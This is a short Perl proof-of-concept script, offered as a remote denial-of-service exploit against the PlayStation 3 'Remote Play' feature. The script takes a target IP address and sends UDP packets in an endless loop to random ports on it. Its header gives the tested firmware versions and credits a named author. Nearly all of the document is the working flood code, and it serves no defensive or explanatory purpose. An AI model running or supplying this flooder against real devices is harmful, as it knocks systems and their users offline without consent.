#!/usr/bin/perl

####.:Playstation 3 "Remote Play" Remote DoS Exploit:.####
#
# A UDP flood while the "remote play" feature is active
# will result in a denial of service condition.	
#
# Tested using PS3 v1.60 (20GB) & PSP v3.10 OE-A
#
# -Dark_K <mak0b[AT]inbox.com>
# 
# POC code is based on odix's perl udp flooder
##########################################################

use Socket;

$ARGC=@ARGV;

if ($ARGC !=1) {
 printf "usage: ./ps3rpdos.pl <ip>\n";
 exit(1);
}

socket(crazy, PF_INET, SOCK_DGRAM, 17);
    $iaddr = inet_aton("$ARGV[0]");

printf "Sending...\n";

for (;;) {
 $size=$rand x $rand x $rand;
 $port=int(rand 65000) +1;
 send(crazy, 0, $size, sockaddr_in($port, $iaddr));
}

 

